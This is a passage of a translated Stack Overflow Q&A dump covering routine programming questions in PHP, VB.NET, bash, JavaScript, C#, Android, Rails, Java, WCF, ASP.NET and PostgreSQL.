    foreach ( $comments as $comment )
    {
        print "<li>$comment->comment_author<br>$comment->comment_content</li>";
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-27T07:29:28.893

我发现了问题，我忘了设置全局变量：

```
global $withcomments; 
```

我正在使用

```
$withcomments = true; 
comments_template(); 
```

但是没有全局它就行不通。

现在像普通评论一样工作。

# vb.net - 每个新行的 VB.NET

> ID：10338673
> 
> 赞同：1
> 
> 时间：2012-04-26T17:47:07.533
> 
> 标签：vb.net, for-loop, each, explode

我需要帮助创建一个打开文件的函数，并为每一行创建一个变量，如`explode("\n", $var)`PHP。我试过了

```
Dim words As String = GetFileContents(OpenFileDialog1.FileName)
For Each word As String In words
    Dim doHash As String = MD5(word)
    If String.Equals(doHash, hash.Text) Then
        Label2.Text = "derp"
    Else
        Label2.Text = "lol"
    End If
Next 
```

但它使每个字母成为一个新变量。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:53:43.253

你想用`System.IO.File.ReadLines(OpenFileDialog1.FileName)`. 这将导致`For Each`循环分别获取每一行。

具体来说：

```
For Each word As String In File.ReadLines(OpenFileDialog1.FileName)
    Dim doHash As String = MD5(word)
    If String.Equals(doHash, hash.Text) Then
        Label2.Text = "derp"
    Else
        Label2.Text = "lol"
    End If
Next 
```

我注意到您的 php 示例肯定在换行符上拆分，但您的循环变量被称为`word`. 你的文件每行有一个单词吗？没关系，但我想仔细检查你是否可以接受循环获取每一*行*，而不是每个*单词*（如果每行有多个单词）。

# java - JPPF (jppf.org) 有人可以分享他们使用 JPPF 的经验吗？

> ID：10338678
> 
> 赞同：2
> 
> 时间：2012-04-26T17:47:23.787
> 
> 标签：java, parallel-processing

我正在考虑将 JPPF 用于并行运行一组任务的应用程序。我想知道是否有人最近有使用该框架的经验。我特别感兴趣 1\. 围绕“稳健性”的方面，例如从节点故障中恢复。2.在500+节点上运行任务。3.网络流量

# c# - EnvDTE80.Window2'不包含'CreateToolWindow2'的定义

> ID：10338681
> 
> 赞同：1
> 
> 时间：2012-04-26T17:47:44.293
> 
> 标签：c#, visual-studio-2010, visual-studio-addins

我是 VS-2010 插件的新手，所以我从这个演练开始：

*   [如何：从 Visual Studio .NET 插件创建可停靠工具窗口](http://www.mztools.com/articles/2006/mz2006007.aspx)

但是当我构建我的项目时，我收到以下错误：

> “EnvDTE80.Window2”不包含“CreateToolWindow2”的定义，并且找不到接受“EnvDTE80.Window2”类型的第一个参数的扩展方法“CreateToolWindow2”（您是否缺少 using 指令或程序集）

我在我的项目中添加了程序集引用（实际上是加载项向导）。有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T00:32:05.670

它是 Windows2.CreateToolWindow2()。注意“窗口”后面的 s。

# bash - bash：在引号中处理引号

> ID：10338683
> 
> 赞同：2
> 
> 时间：2012-04-26T17:47:52.313
> 
> 标签：bash, escaping, quotes

我将脚本中的一个问题隔离到这个小示例中。这就是我得到的：

```
$ cmd="test \"foo bar baz\""
$ for i in $cmd; do echo $i; done
test
"foo
bar
baz" 
```

这就是我所期望的：

```
$ cmd="test \"foo bar baz\""
$ for i in $cmd; do echo $i; done
test
"foo bar baz" 
```

如何更改我的代码以获得预期的结果？

* * *

**更新**也许我的第一个例子不够好。我查看了 Rob Davis 的答案，但无法将解决方案应用于我的脚本。我试图简化我的脚本以更好地描述我的问题。这是脚本：

```
#!/bin/bash
function foo {
  echo $1
  echo $2
}

bar="b c"

baz="a \"$bar\""
foo $baz 
```

这是与脚本输出相比的预期输出：

```
expected  script
a         a 
"b c"     "b 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:40:28.373

首先，你要求双引号`foo bar baz`同时做两件事，而他们不能。您希望他们将这三个单词组合在一起，并且希望它们显示为文字。所以你需要介绍另一对。

其次，解析发生在您设置`cmd`, 并`cmd`设置为单个字符串时。您希望将其作为单个元素使用，因此一种解决方案是使用数组变量。`sh`有一个名为 的数组`@`，但是由于您使用的是 bash ，因此您可以将`cmd`变量设置为数组。

此外，为了保持元素内的间距，最好在 . 周围加上双引号`$i`。`foo`如果在and之间放置多个空格，您就会明白为什么`bar`。

```
$ cmd=(test "\"foo bar baz\"")
$ for i in "${cmd[@]}"; do echo "$i"; done 
```

有关 sh 和 bash的特殊或解析功能的更多详细信息，请参阅[此问题。](https://stackoverflow.com/questions/6310671/why-does-work-different-from-most-other-variables-in-bash)`"$@"``"${cmd[@]}"`

**更新**

将此想法应用于您问题中的更新，尝试像这样设置`baz`和调用`foo`：

```
$ baz=(a "\"$bar\"")
$ foo "${baz[@]}" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:51:23.843

为什么首先引用它？

```
for i in test "foo bar baz"; do echo $i; done 
```

# javascript - 正则表达式查找提及

> ID：10338685
> 
> 赞同：1
> 
> 时间：2012-04-26T17:48:04.483
> 
> 标签：javascript, regex

我正在寻找一个匹配的 Javascript 中的正则表达式，就像一个字符串

`@Mr. Smith Hello !`

，其中 Mr. Smith 是用户的姓名，出现次数

`Mr.` `Mr. Smith` `Mr. Smith Hello` `Mr. Smith Hello !`

现在，我尝试的每个正则表达式都返回了

`@Mr. Smith Hello !`和`Mr. Smith Hello !`,

而忽略`Mr.`，`Mr. Smith`和`Mr. Smith Hello`...

我试过这个：

`/^@(.*) /`,`/^@(.*)* /`和`/^@([^ ].*) /`

谢谢你的帮助 ！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T18:01:05.590

单个正则表达式不能将重叠文本作为单独的匹配返回，因为每个匹配都会消耗输入文本的一部分。但是，您可以创建嵌套捕获组，如下所示（演示：[http](http://www.rubular.com/r/bsu52a1eL9) ://www.rubular.com/r/bsu52a1eL9 ）：

```
@(((([^ ]*) [^ ]*) [^ ]*) [^ ]*) 
```

当然，这仅适用于您提供的确切字符串格式，恰好有 3 个空格 / 4 个单独的单词。更好的解决方案是使用[**`substring`**](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/substring)and[**`split`**](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/split)方法，然后您可以手动重新组合部件：

```
var input = "@Mr. Smith Hello !";
var parts = input.substring(1).split(' ');
//parts = ["Mr.","Smith","Hello","!"]
var temp = "";
var output = [];

for (var i = 0; i < parts.length; i++)
{
    if (temp != "") temp += " ";
    temp += parts[i];
    output[i] = temp;
}
//output = ["Mr.", "Mr. Smith", "Mr. Smith Hello", "Mr. Smith Hello !"] 
```

演示：http: [//jsfiddle.net/jbk4h/](http://jsfiddle.net/jbk4h/)

# c# - 目录树数组中的路径

> ID：10338686
> 
> 赞同：0
> 
> 时间：2012-04-26T17:48:05.183
> 
> 标签：c#, directory

我`Directory.GetFiles`用来查找将被复制的文件。我需要找到文件的路径，以便我可以使用副本，但我不知道如何找到路径。它可以很好地遍历文件，但我无法复制或移动它们，因为我需要文件的源路径。

这就是我所拥有的：

```
string[] files = Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories);

System.Console.WriteLine("Files Found");

// Display all the files.
foreach (string file in files)
{
  string extension = Path.GetExtension(file);
  string thenameofdoom = Path.GetFileNameWithoutExtension(file);
  string filename = Path.GetFileName(file);

  bool b = false;
  string newlocation = (@"\\TEST12CVG\Public\Posts\Temporaryjunk\");

  if (extension == ".pst" || 
    extension == ".tec" || 
    extension == ".pas" || 
    extension == ".snc" || 
    extension == ".cst")
  {
    b = true;
  }

  if (thenameofdoom == "Plasma" || 
    thenameofdoom == "Oxygas" || 
    thenameofdoom == "plasma" || 
    thenameofdoom == "oxygas" || 
    thenameofdoom == "Oxyfuel" || 
    thenameofdoom == "oxyfuel")
  {
    b = false;
  }

  if (b == true)
  {
    File.Copy(file, newlocation + thenameofdoom);
    System.Console.WriteLine("Success: " + filename);
    b = false;
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:12:17.157

`Path.GetFullPath`工作，但也考虑使用`FileInfo`许多文件帮助方法。

我会使用与此类似的方法（可以使用更多的错误处理（尝试捕获...），但这是一个好的开始

**编辑**我注意到您正在过滤掉扩展，但需要它们，更新代码允许这样做

```
class BackupOptions
{
  public IEnumerable<string> ExtensionsToAllow { get; set; }
  public IEnumerable<string> ExtensionsToIgnore { get; set; }
  public IEnumerable<string> NamesToIgnore { get; set; }
  public bool CaseInsensitive { get; set; }

  public BackupOptions()
  {
    ExtensionsToAllow = new string[] { };
    ExtensionsToIgnore = new string[] { };
    NamesToIgnore = new string[] { };
  }
}

static void Backup(string sourcePath, string destinationPath, BackupOptions options = null)
{

  if (options == null)
    optionns = new BackupOptions();

  string[] files = Directory.GetFiles(sourcePath, ".", SearchOption.AllDirectories);
  StringComparison comp = options.CaseInsensitive ? StringComparison.CurrentCultureIgnoreCase : StringComparison.CurrentCulture;

  foreach (var file in files)
  {
    FileInfo info = new FileInfo(file);

    if (options.ExtensionsToAllow.Count() > 0 &&
      !options.ExtensionsToAllow.Any(allow => info.Extension.Equals(allow, comp)))
      continue;

    if (options.ExtensionsToIgnore.Any(ignore => info.Extension.Equals(ignore, comp)))
        continue;

    if (options.NamesToIgnore.Any(ignore => info.Name.Equals(ignore, comp)))
      continue;

    try
    {
      File.Copy(info.FullName, destinationPath + "\\" + info.Name);
    }
    catch (Exception ex)
    {
      // report/handle error
    }
  }
} 
```

像这样的电话：

```
var options = new BackupOptions
{
  ExtensionsToAllow = new string[] { ".pst", ".tec", ".pas", ".snc", ".cst" },
  NamesToIgnore = new string[] { "Plasma", "Oxygas", "Oxyfuel" },
  CaseInsensitive = true
};

Backup("D:\\temp", "D:\\backup", options); 
```

# android - Android可扩展下拉栏-SlidingDrawer之类

> ID：10338687
> 
> 赞同：0
> 
> 时间：2012-04-26T17:48:06.137
> 
> 标签：android, slidingdrawer

我正在努力实现某事。下图描述得最好。我尝试了 SlidingDrawer，甚至是这里有人在 SO 上提出的 WrappingSlidingDrawer。但是我对 SlidingDrawer 的问题是（1）它占据了一个恒定的高度，我希望它“移动”下面的列表视图。(2) 它从下向上扩展，我希望它从上向下扩展 (3) 它的标题在其主体上方，我希望其标题在其主体下方。怎么做？

![抽屉隐藏和展开](../Images/ae92d78289b02c26295edf8054b08e5c.png)

我的伪代码如下：

```
<RelativeLayout
xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
>

<!-- Header >    
    android:id="@+id/header"  
            android:layout_width="fill_parent"
    android:layout_height="wrap_content"
            android:layout_alignParentTop="true"
    -->    

<!-- Footer >    
    android:id="@+id/footer"  
            android:layout_width="fill_parent"
    android:layout_height="wrap_content"
            android:layout_alignParentBottom="true"
    -->    

<LinearLayout
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_above="@id/footer"
    android:layout_below="@id/header"
    android:orientation="vertical"
    >

    <!-- >my.package.WrappingSlidingDrawer -->
    <SlidingDrawer
         android:id="@+id/myDrawerBar"
         android:layout_width="fill_parent"
         android:layout_height="wrap_content"
         android:orientation="vertical"

         android:content="@+id/Body"
         android:handle="@+id/Subheader"  >

         <LinearLayout
             android:id="@id/Subheader"
             style="@style/Subheader"
             android:layout_width="fill_parent"
             android:layout_height="20dip">
             <TextView
                 android:id="@+id/SubheaderLabel"
                 android:layout_width="wrap_content"
                 android:layout_height="wrap_content"
                 />
         </LinearLayout>

         <LinearLayout
             android:id="@id/Body"
             android:layout_width="fill_parent"
             android:layout_height="wrap_content">
             .....
         </LinearLayout> 
    <!-- /my.package.WrappingSlidingDrawer-->
    </SlidingDrawer>    

    <ListView
        android:id="@+id/myListView"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
         />

</LinearLayout>        

</RelativeLayout> 
```

# ruby-on-rails - 如何通过会话 ID 找到设计用户？

> ID：10338692
> 
> 赞同：18
> 
> 时间：2012-04-26T17:48:17.733
> 
> 标签：ruby-on-rails, ruby, session, devise

鉴于`session["session_id"]`是否可以找到该`User`会话所属的登录帐户？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-04-26T18:01:30.360

至少在我的系统上（rails 3.2，devise 2.0.4），你可以这样做：

`session`是：

```
{"session_id"=>"be02f27d504672bab3408a0ccf5c1db5", "_csrf_token"=>"DKaCNX3/DMloaCHbVSNq33NJjYIg51X0z/p2T1VRzfY=", "warden.user.user.key"=>["User", [3], "$2a$10$5HFWNuz5p6fT3Z4ZvJfQq."]} 
```

`session["warden.user.user.key"][1][0]`, 那么是`3`.

所以，我会发现它是：

```
User.find(session["warden.user.user.key"][1][0]) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-26T18:39:28.413

我不确定您要完成什么，但会尝试回答

如果您只想要当前会话中的用户，一种简单的方法是将他的 id 存储在会话中，例如：

```
def login(username, pass)
  # do the usual authentication stuff and get user
  if logedin
    session[:user_id] = user.id
  end
end 
```

然后获取当前用户将类似于

```
current_user =User.find(session[:user_id]) 
```

* * *

如果您想要查找当前登录的所有用户，我认为您需要配置您的应用程序以将会话保存在数据库中，因为预定义的是会话数据存储在浏览器的 cookie 中。有关此问题的更多信息，请查看此答案 [如何在 Rails 中跟踪在线用户？](https://stackoverflow.com/questions/586499/how-to-track-online-users-in-rails)

* * *

**编辑：**刚刚注意到你正在使用设计，所以第一种方法实际上是为你准备的。您只需要`current_user`在任何控制器上调用方法。对于第二种方法[，使用 Rails 中的 Devise 检查这个答案“Who's Online”](https://stackoverflow.com/questions/5504130/whos-online-using-devise-in-rails)

# javascript - 检测用户是否更改选项卡的 Javascript

> ID：10338704
> 
> 赞同：64
> 
> 时间：2012-04-26T17:49:11.727
> 
> 标签：javascript, html

我正在为在线测验写一个网页。我的基本要求是，如果用户更改标签或打开新闻窗口，即使没有最小化他们的浏览器，它也必须触发一个事件（停止测验），即如果该人试图从其他窗口/标签查看答案。我怎样才能做到这一点？

**注意：**尽量避免在您的答案中包含最前沿的 HTML5 功能，因为我希望目前所有主要浏览器都支持该功能。

* * *

## 回答 #1

> 赞同：78
> 
> 时间：2012-04-26T17:52:38.903

您可以通过将模糊/焦点事件侦听器附加到窗口来确定选项卡或窗口是否处于活动状态。

在 jQuery 中它会是

```
$(window).focus(function() {
    //do something
});

$(window).blur(function() {
    //do something
}); 
```

引用自这个 SO 答案：[https ://stackoverflow.com/a/1760268/680578](https://stackoverflow.com/a/1760268/680578)

* * *

## 回答 #2

> 赞同：48
> 
> 时间：2020-09-01T20:44:38.377

在 2022 中，您可以将事件侦听器与`visibilitychange`事件一起使用：

```
document.addEventListener("visibilitychange", (event) => {
  if (document.visibilityState == "visible") {
    console.log("tab is active")
  } else {
    console.log("tab is inactive")
  }
});
```

* * *

## 回答 #3

> 赞同：34
> 
> 时间：2012-04-26T17:52:36.953

如果您的目标浏览器支持它，您可以使用 HTML5 中提供的 Page Visibility API。它不会直接检测选项卡更改，例如，但可见性更改。这将包括（但不限于）选项卡更改。

请参阅[https://developer.mozilla.org/en/DOM/Using_the_Page_Visibility_API](https://developer.mozilla.org/en/DOM/Using_the_Page_Visibility_API)

* * *

## 回答 #4

> 赞同：28
> 
> 时间：2017-08-11T15:03:57.467

最好的本机函数，没有 jQuery。

```
document.hasFocus 
```

检查笔，检查当您转到链接并返回 codepen 选项卡时会发生什么。

[https://codepen.io/damianocel/pen/Yxxzdj](https://codepen.io/damianocel/pen/Yxxzdj)

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2018-12-21T13:26:11.820

使用 jQuery：

```
$(window).on('focus', function () {

});

$(window).on('blur', function () {

}); 
```

`$().focus`&`$().blur`已弃用。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2021-01-17T16:44:08.330

从事类似的项目。这效果最好。在通常不会重新渲染的最高级别组件上，添加：

```
 setInterval( checkFocus, 200 );

  function checkFocus(){
    if(document.hasFocus()==false){
      //Do some checking and raise a red flag if this runs during an exam.
    }
  } 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2021-10-09T19:25:06.713

窗口`onfocus`和`onblur`工作正常：

```
window.onfocus = function (ev) {
    console.log("gained focus");
};

window.onblur = function (ev) {
    console.log("lost focus");
}; 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-07-30T07:37:02.277

我需要这样的东西，似乎每个浏览器的这种行为都略有不同。

```
 if (document.hidden !== undefined) { // Opera 12.10 and Firefox 18 and later support     
      visibilityChange = "visibilitychange";
    } else if (document.mozHidden !== undefined) {      
      visibilityChange = "mozvisibilitychange";
    } else if (document.msHidden !== undefined) {      
      visibilityChange = "msvisibilitychange";
    } else if (document.webkitHidden !== undefined) {      
      visibilityChange = "webkitvisibilitychange";
    } else if (document.oHidden !== undefined) {      
      visibilityChange = "ovisibilitychange";
    }

    document.addEventListener(visibilityChange, function(event) {
      handleVisibilityChange();
    }, false); 
```

我有一个例子你可以检查： [https ://jsfiddle.net/jenol/4g1k80jq/33/](https://jsfiddle.net/jenol/4g1k80jq/33/)

# java - 内部类和局部变量

> ID：10338708
> 
> 赞同：14
> 
> 时间：2012-04-26T17:50:02.693
> 
> 标签：java, inner-classes, local-variables

为什么我需要声明一个`local variable`好像`final`我`Inner class`在方法中定义的需要使用它？

例子 ：

```
class MyOuter2 {

private String x = "Outer2";

void doStuff() {
    final String y = "Hello World";

    final class MyInner {

        String z = y;

        public void seeOuter() {
            System.out.println("Outer x is "+x);
            System.out.println("Local variable is "+y);
            MyInner mi = new MyInner();
            mi.seeOuter();
        }
    }
} 
```

}

为什么字符串`y`需要是最终常量？它如何影响？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-26T17:55:15.067

局部变量总是存在于堆栈中，当方法结束时，所有局部变量都消失了。

但是即使在方法结束后，您的内部类对象也可能在堆上（假设一个实例变量保留了引用），因此在这种情况下，它无法访问您的局部变量，因为它们已经消失，除非您将它们标记为 final

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-04-26T17:53:45.120

答案是两者属于不同的范围。因此，该变量可以在内部类访问它之前更改。让它最终防止这种情况发生。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-07-10T20:48:00.850

这是因为函数内部的内部类实际上复制了局部变量，因为局部变量可能在函数调用后被销毁，而局部类的实例仍然存在。要使局部变量的两个副本始终具有相同的值（使它们看起来相同），您必须将变量声明为 final。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-26T17:52:13.750

我认为这是为了防止程序员出错。这样，编译器会提醒程序员，当您离开该方法时，该变量将不再可访问。这对于循环至关重要。想象一下这段代码：

```
public void doStuff()
{
    InnerClass cls[] = new InnerClass[100];
    for (int i = 0; i < 100; ++i)
    {
        cls[i] = new InnerClass()
        {
            void doIt()
            {
                System.out.println(i);
            }
        };
    }
} 
```

当`doIt()`方法被调用时，会打印什么？`i`循环时更改。为了防止这种混淆，您必须将变量复制到局部变量或创建变量 final，但是您将无法循环。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-26T17:53:47.717

您的内部类是最终的，因此您不应该能够从最终实体内部修改任何内容。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-07-20T06:27:14.510

根据 Java 内存模型，使用 final 变量可以保证始终初始化 final 变量。当我们尝试在没有初始化的情况下使用局部变量时会出错。using final 保证内部类初始化使用的局部变量。

# c# - WCF InstanceContextMode.PerSession

> ID：10338711
> 
> 赞同：1
> 
> 时间：2012-04-26T17:50:13.967
> 
> 标签：c#, wcf

如果我使用这个：InstanceContextMode.PerSession，那么对于每个客户端，我都会初始化我的服务一次。我对吗？

**如果我调用具有 [OperationBehavior(TransactionScopeRequired = true)] 的方法，则会调用 JobImplement 构造函数。为什么？**

我的服务：

```
[ServiceBehavior(InstanceContextMode = InstanceContextMode.PerSession)]
    public class JobImplement : IJob
    {
        public static int Sum = 0;
        public JobImplement()
        {
            Sum++;
        }
        [OperationBehavior(TransactionScopeRequired = true)]
        public void UselessMethod1()
        {
        }
        [OperationBehavior(TransactionScopeRequired = true)]
        public void AddEmployee(string Name, string Age)
        {
        }
        public int GetSum()
        {
            return Sum;
        }
    } 
```

**编辑1：**

我使用 WSHttpBinding 绑定，这是我唯一的客户端代码。

我的客户：

```
static void Main(string[] args)
        {
            ServiceReference1.IJob Service1 = new ServiceReference1.JobClient();
            Service1.UselessMethod1();//sum become [1]
            Service1.AddEmployee("","");//sum become [2]
            Console.WriteLine(Service1.GetSum());//show [2].
            Console.WriteLine(Service1.GetSum());//show [2].
            Console.WriteLine(Service1.GetSum());//show [2].
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T20:44:10.680

此处编写的服务使用`ServiceBehavior.ReleaseServiceInstanceOnTransactionComplete`属性的默认值，即`true`.

这意味着通过执行事务范围的方法`TransactionScopeRequired`将导致服务实例被释放，并且下一次调用方法时，尽管您希望创建一个新实例`InstanceContextMode`。

将相关属性更改为`false`应该可以解决问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T18:09:14.597

看起来您每次客户端调用您的服务时都会创建新的服务实例。这可能是因为客户端终止了会话（以及您的构造函数）。例如客户端关闭代理，在这种情况下，下次客户端调用服务时，将创建新会话。每次连接到服务时，您是否检查过您没有关闭代理？

# jquery - 这是一个好的 asp.net 网站架构选择吗？

> ID：10338717
> 
> 赞同：2
> 
> 时间：2012-04-26T17:50:40.287
> 
> 标签：jquery, asp.net

我目前正在一个 asp.net 网站上工作，并且正在使用网络表单。在使用服务器控件（网格视图、图表等）之前，我有一些构建 asp.net 网站的经验，我觉得它们很慢。我尝试了一些具有所有控件（网格、图表、树等）的 jquery 套件，至少是我需要的那些，我喜欢它们主要是因为它们的速度和改进的用户体验。我打算在我的网站上不使用任何 asp 服务器控件，而是使用纯 html 和 jquery 插件。

不使用任何 asp.net 服务器控件并将大部分处理转移到客户端是一个不错的选择吗？

我知道如果客户端浏览器关闭了 javascript，那么我的网站将根本无法运行。

但除此之外，鉴于我们未来开发移动应用程序和/或实施 MVC 的计划，我可能会面临哪些问题？

如果所有内容最终都呈现为 html 并且我可以使用 jquery ajax 请求获取/发布数据，我为什么还要使用 asp.net 服务器控件？

任何帮助是极大的赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:54:54.543

如果您没有使用 ASP.NET 控件，那么您并没有真正使用 ASP.NET 网络表单。控件为您提供客户端和服务器端交互。

就您所说的而言，这听起来像 MVC 是从一开始就要走的路。默认项目已经包含 jQuery，并且由于没有 MVC 控件，它只是 HTML 和 Javascript 将您的 GET/POST 传递给控制器​​。

此外，JSON 支持允许与 jQuery 进行非常漂亮、干净和轻量的数据交互。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:56:07.410

远不是一个完整的答案，我想提供我的 2 美分。如果您正在为任何网站使用 .NET，我的拙见是您应该使用 MVC。使用 MVC，您可以更好地分离业务层和 UI。

您可以通过创建支持 xml 或 json 响应的控制器轻松创建对 API 的支持，这将有助于丰富的用户界面，使用 jquery、extjs 等框架，并准备好使用相同的 API 支持移动设备.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T18:02:59.453

我不喜欢 Microsoft MVC - 但这只是我。

MVC 是一种模式，而不是一种技术，因此您可以随心所欲地实现它。

如果您不想学习 Microsoft 的 MVC 实现，您可能会考虑做一些事情，仍然使用 WebForms，但是使用 MVC 样式来开发您的应用程序是这样的：

VIEW：ASP.NET 页面（无服务器端控件）`builds`页面

控制器：jQuery / Javascript`calls`通用处理程序文件 (ASHX) 和`returns`JSON

模型：ASHX`calls`模型（您的自定义类）

这样，您使用的是 MVC 模式，但您不会被微软的实现所束缚，现在，您可以使用相同的控制器开发网站和移动应用程序，因为您的控制器级别是通过 ASHX 文件公开的.

希望这是有道理的。

您显然必须处理安全性和访问您的 ASHX 文件等。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-26T18:00:44.147

大约一年前我遇到过你的情况，得出的结论和你一样。

更进一步，我意识到我什至不需要 aspx 页面：只需使用母版页构建 HTML5 页面，该母版页使用文字（我使用的唯一 asp.net 控件）在页面加载时注入 json 数据，然后使用 WCF 实现使用 jquery ajax 来回传输数据的面向服务的体系结构。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-26T18:05:08.190

首先，我认为“服务器控件”和服务器端值得区分。

*   确保您可以在 HTML/JS 中完成所有前端
*   如果您在浏览器之外有数据源，则至少需要与“服务器端”进行通信，无论它可能是什么。这与“服务器控件”无关
*   验证/安全 - 你不能在客户端做所有这些。*客户端的所有*内容都可以查看/篡改
*   正如已经回答的那样，MVC*不需要*控件 - 只是澄清您*可以*在 ASP.Net MVC 中使用控件。核心概念是**其所有的 ASP.Net**，您可以随意混合/匹配 - 甚至是语言（VB.Net、C#）

Web 表单仍然占有一席之地，并且没有什么会阻碍 jQuery 或其他任何东西。

“慢”取决于很多事情。我根本不会责怪 Web 表单（技术）**。**无论采用什么技术，都会发生代码错误。

# postgresql - postgresql根据其他列的值计算列的最小值

> ID：10338718
> 
> 赞同：1
> 
> 时间：2012-04-26T17:50:44.590
> 
> 标签：postgresql

我可以使用标准 SQL 执行此操作，还是需要为以下问题创建一个函数？

我有 14 列，代表 7 个连续对象的 2 个属性（从 1 到 7 的顺序很重要），所以 table.object1prop1，...，table.object1prop7，table.objects2prop2，...，table.objects2prop7。

我需要计算 7 个对象的属性 2 的最小值，这些对象的值小于属性 1 的特定阈值。这 7 个对象的属性 1 的值采用升序算术刻度。所以对象 1 的属性 1 永远小于对象 1 的属性 2。

提前感谢您提供任何线索！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:56:31.483

如果数据被标准化，这将更容易。（提示，任何时候你找到一个带有数字的列名，你都会看到一个很大的危险信号，表明模式不是第三范式。）使用你描述的表，它需要相当多的代码，但`greatest()`and`least()`函数可能是你最好的朋友。

[http://www.postgresql.org/docs/current/interactive/functions-conditional.html#FUNCTIONS-GREATEST-LEAST](http://www.postgresql.org/docs/current/interactive/functions-conditional.html#FUNCTIONS-GREATEST-LEAST)

如果我必须为此编写代码，我可能会将这些值输入 CTE 并从那里开始工作。

# c# - Windows 窗体的更新 - C#

> ID：10338723
> 
> 赞同：1
> 
> 时间：2012-04-26T17:50:52.397
> 
> 标签：c#

解释：

结构：Windows窗体——三个组件：文本框、文本框响应和按钮。

问题：我正在使用 C# windows 窗体移动电机：我正在启动电机并通过
单击按钮来反转电机的运动方向，中间有 10 秒的延迟。即我启动电机，延迟 10 秒，然后反转电机。我想在开始时显示“开始”，在 10 秒延迟结束时显示“结束”。我尝试过使用线程，但它不起作用。但我只能在文本框中看到“完成”而不是“开始”。代码如下：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;

namespace SampleThreadProgram
{
     public partial class Form1 : Form
     {
          static EventWaitHandle _waitHandle = new AutoResetEvent(false);
          delegate void SetTextCallback(string text);

     void SetText(string text)
     {
          if (textBox.InvokeRequired)
          {
             SetTextCallback d = new SetTextCallback(SetText);
             BeginInvoke(d, new object[] { text });
          }
          else
          {
             textBox.Text = text;
          }
     }

    void UpdateTextBox(string message)
    {
        SetText(message);
        _waitHandle.Set();
    }

    void Wait()
    {
        for (ulong i = 0; i < 10000; i++)
        {
            for (ulong j = 0; j < 100000; j++)
            {
            }
        }

    }
    public Form1()
    {
        InitializeComponent();
    }

    private void Form1_Load(object sender, EventArgs e)
    {

    }

    private void button1_Click(object sender, EventArgs e)
    {

        UpdateTextBox("Start");
        _waitHandle.WaitOne();
        Thread.Sleep(10000);
        UpdateTextBox("Finish");

    }

    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T17:57:41.717

1.  您不应该使用大而长的`for`循环来让计算机等待一段时间。`Thread.Sleep`至少使用。
2.  你应该使用 a`BackgroundWorker`来做你想做的事情。在按钮单击事件中设置开始文本，然后启动后台工作程序。您可以让`DoWork`事件做一些工作（在这种情况下是休眠）并使用 WorkerCompleted 事件来更新 UI。

使用后台工作者的好处是您不必担心从非 UI 线程更新代码。在按钮单击事件中，您可以直接更新文本框的文本，`BackGroundWorker`线程已经确保`Completed`事件在 UI 线程中运行，因此即使在那里您也可以直接访问 UI 控件。BGW 专门设计用于使这种确切的情况更容易。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:57:27.287

没有足够的时间更新 UI。在in`Application.DoEvents();`之后添加一个。`SetText(message);``UpdateTextBox`

# c# - ASP.NET MVC 中的自定义安全方案

> ID：10338734
> 
> 赞同：1
> 
> 时间：2012-04-26T17:51:36.730
> 
> 标签：c#, asp.net-mvc, security, authentication

我没有很多这方面的经验，我真的希望从你们那里得到一个好的建议。我需要实现以下安全场景，我想知道最好的方法。

想象一下，我们有员工、主管和部门经理。员工和主管都根据他们所属的部门经理分配了 ManagerId。

当主管用户登录时，我希望他只看到与他属于同一 ManagerId 的员工的记录。如果具有另一个 ManagerId 用户的另一个主管登录并在 url 中手动打卡其他员工的信息（例如： wwww.domain.com/employee/details/{id} ），因为他的 ManagerId != 员工的 ManagerId 我希望访问受到限制.

是否有意义 ？

我开始在所有 ActionMethods 上输入检查，例如：

```
public ActionResult Details(int id)
{
    var employee = employeeRepository.Get(id)
    var user = (CustomIdentity)ControllerContext.HttpContext.User.Identity;

    if(employee.managerId == user.managerId)
    {
        Do whatever...
    }   
    else    
    {
        Not allowed
    }
} 
```

但是在所有 ActionMethods 中输入它似乎是多余的，只是..ehh...我知道必须有更好的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:31:46.653

过去我有一个类似的问题，我会考虑每个对象的权限。我所做的是向对象添加一个成员，类似于：

```
public bool CanUserAccess(User user) {
    return managerId == user.managerId;
} 
